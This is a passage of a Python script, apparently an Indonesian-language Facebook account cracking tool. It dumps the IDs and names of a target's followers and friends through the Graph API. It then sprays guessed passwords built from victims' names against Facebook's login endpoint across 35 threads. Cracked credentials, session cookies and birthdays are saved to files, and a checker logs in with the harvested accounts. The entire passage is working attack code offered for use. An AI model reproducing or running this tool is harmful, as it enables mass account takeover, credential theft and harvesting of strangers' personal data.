            print("%s[%s•%s]%s \033[0;95mIP      :%s -\n"%(H,P,H,P,K))

    except (KeyError):

        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(3);os.system('rm -rf login.txt');___login___()

    except (ConnectionError):

        exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P)) 

    print("%s[%s\033[0;91m01%s]%s \033[0;91mDump ID Follower All (Make by siam) %s[%s\033[0;91m2004-2022%s]"%(B,P,B,P,B,P,B))

    print("%s[%s\033[0;92m02%s]%s \033[0;92mDump ID Follower Old (Make by siam)%s[%s\033[0;92m2004-2009%s]"%(B,P,B,P,B,P,B))

    print("%s[%s\033[0;93m03%s]%s \033[0;93mDump ID Follower New (Make by siam) %s[%s\033[0;93m2020-2022%s]"%(B,P,B,P,B,P,B))

    print("%s[%s\033[0;94m04%s]%s \033[0;94mDump ID Public All (Make by siam)%s[%s\033[0;94m2004-2022%s]"%(B,P,B,P,B,P,B))

    print("%s[%s\033[0;95m05%s]%s \033[0;95mDump ID Public Old (Make by siam)%s[%s\033[0;95m2004-2009%s]"%(B,P,B,P,B,P,B))

    print("%s[%s\033[0;96m06%s]%s \033[0;96mDump ID Public New (Make by siam)%s[%s\033[0;96m2020-2022%s]"%(B,P,B,P,B,P,B))

    

    print("%s[%s\033[0;90m00%s]%s \033[0;91mRemove \033[0;92mToken\n"%(B,P,B,P)) 

    ___pilih = input("%s[%s\033[0;91m?%s]%s \033[0;92mChoose :%s "%(H,P,H,P,K))

    if ___pilih in ['1','01']:

        ___acak___()

    elif ___pilih in ['2','02']:

        ___old___()

    elif ___pilih in ['3','03']:

        ___new___()

    elif ___pilih in ['4','04']:

        ___acak2___()

    elif ___pilih in ['5','05']:

        ___old2___()

    elif ___pilih in ['6','06']:

        ___new2___()

    elif ___pilih in ['7','7']:

        ___password___()

    elif ___pilih in ['a','A']:

        ___opsi___()

    elif ___pilih in ['8','8']:

        print("\n%s[%s1%s]%s save Ok (Make by siam) "%(B,P,B,P))

        print("%s[%s2%s]%s save Cp (Make by siam)"%(B,P,B,P))

        print("%s[%s3%s]%s i lub u"%(B,P,B,P))

        ___hasil = input("\n%s[%s\033[0;91m?%s]%s \033[0;92mChoose :%s "%(H,P,H,P,K))

        if ___hasil in ['1','01']:

            print("%s "%(H));os.system('cat Results/Ok.txt');exit()

        elif ___hasil in ['2','02']:

            print("%s "%(K));os.system('cat Results/Cp.txt');exit()

        elif ___hasil in ['03','03']:

            ___menu___()

        else:

            exit("%s[%s!%s]%s Wrong Input"%(M,P,M,P))

    elif ___pilih in ['0','00']:

        print("%s[%s!%s]%s Menghapus Token"%(K,P,K,P));os.system('rm -rf login.txt');exit()

    else:

        exit("%s[%s!%s]%s Wrong Input"%(M,P,M,P))

def ___acak___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('/sdcard/'+___file,'w')

            for z in requests.get('https://graph.facebook.com/{}/subscribers?access_token={}&limit=5000'.format(___user,open('login.txt','r').read())).json()['data']:

                ___files.write(z['id']+'|'+z['name']+' \n')

                print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('/sdcard/'+___file,'r').readlines())))

            print("%s[%s?%s]%s Dumb Id File :%s %s\n"%(H,P,H,P,K,'/sdcard/'+___file))

            input("%s{%sBack%s}%s "%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Public"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Public Error"%(K,P,K,P))

def ___old___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('/sdcard/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}/subscribers?access_token={}&limit=5000'.format(___user,open('login.txt','r').read())).json()['data']:

                if len(z['id'])==1 or len(z['id'])==2 or len(z['id'])==3 or len(z['id'])==4 or len(z['id'])==5 or len(z['id'])==6 or len(z['id'])==7 or len(z['id'])==8 or len(z['id'])==9 or len(z['id'])==10:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:10] in ['1000000000']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:9] in ['100000000']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:8] in ['10000000']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('/sdcard/'+___file,'r').readlines())))

            print("%s[%s?%s]%s Dumb Id File :%s %s\n"%(H,P,H,P,K,'/sdcard/'+___file))

            input("%s{%sBack%s}%s "%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Public"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Public Error"%(K,P,K,P))

def ___new___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('/sdcard/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}/subscribers?access_token={}&limit=5000'.format(___user,open('login.txt','r').read())).json()['data']:

                if z['id'][:6] in ['100076','100077','100078','100079','100080','100081','100082']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('/sdcard/'+___file,'r').readlines())))

            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'/sdcard/'+___file))

            input("%s{%sBack%s}%s "%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Public"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Public Error"%(K,P,K,P))

def ___acak2___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('/sdcard/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}'.format(___user,open('login.txt','r').read())).json()['friends']['data']:

                ___files.write(z['id']+'|'+z['name']+' \n')

                print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('/sdcard/'+___file,'r').readlines())))

            print("%s[%s?%s]%s Dumb Id File :%s %s\n"%(H,P,H,P,K,'/sdcard/'+___file))

            input("%s{%sBack%s}%s "%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Public"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Public Error"%(K,P,K,P))

def ___old2___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('/sdcard/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}'.format(___user,open('login.txt','r').read())).json()['friends']['data']:

                if len(z['id'])==1 or len(z['id'])==2 or len(z['id'])==3 or len(z['id'])==4 or len(z['id'])==5 or len(z['id'])==6 or len(z['id'])==7 or len(z['id'])==8 or len(z['id'])==9 or len(z['id'])==10:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:10] in ['1000000000']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:9] in ['100000000']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:8] in ['10000000']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('/sdcard/'+___file,'r').readlines())))

            print("%s[%s?%s]%s Dumb Id File :%s %s\n"%(H,P,H,P,K,'/sdcard/'+___file))

            input("%s{%sBack%s}%s "%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Public"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Public Error"%(K,P,K,P))

def ___new2___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('/sdcard/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}'.format(___user,open('login.txt','r').read())).json()['friends']['data']:

                if z['id'][:6] in ['100076','100077','100078','100079','100080','100081','100082']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('/sdcard/'+___file,'r').readlines())))

            print("%s[%s?%s]%s Dumb Id File :%s %s\n"%(H,P,H,P,K,'/sdcard/'+___file))

            input("%s{%sBack%s}%s "%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Public"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Public Error"%(K,P,K,P))

def ___password___():

    ___cek = input("\n%s[%s?%s]%s Gunakan Password Manual {y/t} :%s "%(B,P,B,P,H))

    if ___cek in ['y','Y']:

        with ThreadPoolExecutor(max_workers=35) as (___hayuk):

            try:

                ___file = input ("%s[%s?%s]%s File Dump :%s "%(B,P,B,P,H))

                ___files = open(___file,'r').read().splitlines()

                ___pws = input("%s[%s?%s]%s Password :%s "%(B,P,B,P,H)).split(',')

                print("%s "%(P))

            except (IOError):

                exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))

            for ___user in ___files:

                uid, name = ___user.split('|')

                ___hayuk.submit(___api___, ___files, uid, ___pws)

        os.remove(___file);exit("\n%s{%sSelesai%s}%s"%(H,P,H,P))

    elif ___cek in ['t','T']:

        with ThreadPoolExecutor(max_workers=35) as (___hayuk):

            try:

                ___file = input ("%s[%s?%s]%s File Dump :%s "%(B,P,B,P,H))

                ___files = open(___file,'r').read().splitlines()

                print("%s[%s?%s]%s Total ID :%s %s"%(B,P,B,P,H,len(___files)))

            except (IOError):

                exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))

            print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di Results/Ok.txt"%(H,P,H,P))

            print("%s[%s•%s]%s Hasil Cp Tersimpan Di Results/Cp.txt\n"%(H,P,H,P))

            for ___user in ___files:

                uid, name = ___user.split('|')

                z = name.split(' ')

                if len(z)==2 or len(z)==3 or len(z)==4 or len(z)==5 or len(z)==6:

                    pwx = [name, z[0]+'123', z[1]+'123', z[0]+'1234', z[1]+'1234', z[0]+'12345', z[1]+'12345', z[0]+'123456', z[1]+'123456', 'Sayang', 'Bismillah']

                else:

                    pwx = [name, z[0]+'123', z[1]+'123', z[0]+'1234', z[1]+'1234', z[0]+'12345', z[1]+'12345', z[0]+'123456', z[1]+'123456', 'Sayang', 'Bismillah']

                ___hayuk.submit(___api___, ___files, uid, pwx)

        os.remove(___file);exit("\n%s{%sSelesai%s}%s"%(H,P,H,P))

def ___api___(total, uid, pwx):

    global loop, ua, ok, cp

    sys.stdout.write(

        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(total), len(ok), len(cp))

    ); sys.stdout.flush()

    try:

        for pw in pwx:

            pw = pw.lower()

            ses = requests.Session()

            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

            send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)

            if 'session_key' in send.text and 'EAAA' in send.text:

                print("\r\x1b[1;92m[Ok] %s|%s|%s\x1b[1;97m"%(uid, pw, send.json()['access_token']))

                ok.append("%s|%s"%(uid, pw))

                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))

                break

            elif 'www.facebook.com' in send.json()['error_msg']:

                try:

                    ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(uid,open('login.txt','r').read())).json()['birthday'];bulan, hari, tahun = ___get.split('/')

                    ___lahir = (hari+'/'+bulan+'/'+tahun)

                except (KeyError,IOError):

                    ___lahir = ('          ')

                except:pass

                print("\r\x1b[1;93m[Cp] %s|%s|%s\x1b[1;97m"%(uid, pw,___lahir))

                cp.append("%s|%s"%(uid, pw))

                open("Results/Cp.txt","a").write("%s|%s|%s\n"%(uid, pw,___lahir))

                break

            else:

                continue

        loop +=1

    except (ConnectionError):

        sys.stdout.write(

            "\r\x1b[1;93m[\x1b[1;97m!\x1b[1;93m]\x1b[1;97m Koneksi Error                "

        ); sys.stdout.flush();sleep(7)

        ___api___(total, uid, pwx)

def ___opsi___():

    ___file = input("\n%s[%s?%s]%s File :%s "%(B,P,B,P,H))

    if ___file in ['',' ']:

        exit("%s[%s!%s]%s Jangan Kosong"%(M,P,M,P))

    try:

        ___files = open(___file,'r').read().splitlines()

    except (IOError):

        exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))

    print("%s[%s?%s]%s Total Akun :%s %s"%(B,P,B,P,H,len(___files)))

    print("\n%s[%s•%s]%s Akun Ok Tersimpan Di Opsi/Ok.txt"%(H,P,H,P))

    print("%s[%s•%s]%s Akun Cp Tersimpan Di Opsi/Cp.txt\n"%(H,P,H,P))

    for ___list in ___files:

        try:

            ___user, ___pasw, ___lahir = ___list.split('|')

            print("%s[%s*%s]%s Check :%s %s|%s|%s"%(B,P,B,P,K,___user,___pasw,___lahir))

            ___start___(___user, ___pasw)

        except (ValueError):

            exit("%s[%s!%s]%s Separator Error"%(M,P,M,P))

    exit("\n%s{%sSelesai%s}%s"%(H,P,H,P))

def ___start___(user, pasw):

    mb = ("https://mbasic.facebook.com")

    ses = requests.Session()

    ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})

    data = {}

    ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")

    fm = ged.find("form",{"method":"post"})

    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]

    for i in fm.find_all("input"):

        if i.get("name") in list:

            data.update({i.get("name"):i.get("value")})

        else:continue

    data.update({"email":user,"pass":pasw})

    run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")

    if "c_user" in ses.cookies:

        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

        run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")

        xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]

        print(" \x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Aplikasi Terhubung :\x1b[1;92m "+str(len(xe)))

        num = 0

        for _ in xe:

            num += 1

            print("    \x1b[1;92m[\x1b[1;97m"+str(num)+"\x1b[1;92m]\x1b[1;97m "+_[0][0]+"\x1b[1;97m,\x1b[1;92m "+_[0][1])

        open('Opsi/Ok.txt','a').write('%s|%s|%s\n'%(user,pasw,kuki))

    elif "checkpoint" in ses.cookies:

        form = run.find("form")

        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]

        jzst = form.find("input",{"name":"jazoest"})["value"]

        nh   = form.find("input",{"name":"nh"})["value"]

        dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}

        parr = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")

        zexe = [yy.text for yy in parr.find_all("option")]

        if str(len(zexe)) == '0':

            print("    \x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97mAkun Tap Yes")

        else:

            for opt in range(len(zexe)):

                print("    \x1b[1;93m[\x1b[1;97m"+str(opt+1)+"\x1b[1;93m]\x1b[1;97m "+zexe[opt])

        open('Opsi/Cp.txt','a').write('%s|%s\n'%(user,pasw))

    elif "login_error" in str(run):

        err = run.find("div",{"id":"login_error"}).find("div").text

        print("    \x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m %s"%(err))

    else:

        print("    \x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Login username and password")

if __name__=='__main__':

    os.system('git pull')

    ___menu___()
